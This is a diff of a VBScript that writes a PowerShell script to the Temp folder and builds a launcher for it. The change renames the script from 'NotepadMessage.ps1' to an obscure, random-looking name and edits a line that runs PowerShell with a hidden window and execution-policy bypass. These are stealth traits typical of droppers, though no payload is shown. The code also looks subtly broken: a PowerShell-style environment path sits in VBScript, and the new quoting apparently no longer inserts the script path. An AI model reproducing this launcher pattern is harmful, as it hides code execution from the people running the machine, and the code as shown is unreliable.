@@ -8,7 +8,7 @@ Set shell = CreateObject("WScript.Shell")
 Dim filePath, strFileExist
 
 ' Check to see if NotepadMessage.p1 exist
-filePath = "$env:APPDATA\Local\Temp\NotepadMessage.ps1"
+filePath = "$env:APPDATA\Local\Temp\wtc9AACOD031020.ps1"
 'Set fso = CreateObject("Scripting.FileSystemObject")
 If fso.FileExists(filePath) Then
     strFileExist = "Yes"
@@ -59,7 +59,9 @@ psFile.Close
 Dim vbsLauncher
 vbsLauncher = _
     "Set shell = CreateObject(""WScript.Shell"")" & vbCrLf & _
-    "shell.Run ""powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psScriptPath & """" & ", 0, False"
+    "shell.Run ""powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "" & psScriptPath & """ & ", 0, False"
+
+'  "shell.Run ""powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psScriptPath & """" & ", 0, False"
 
 Set file = fso.CreateTextFile(notepadScriptPath, True)
 file.WriteLine vbsLauncher
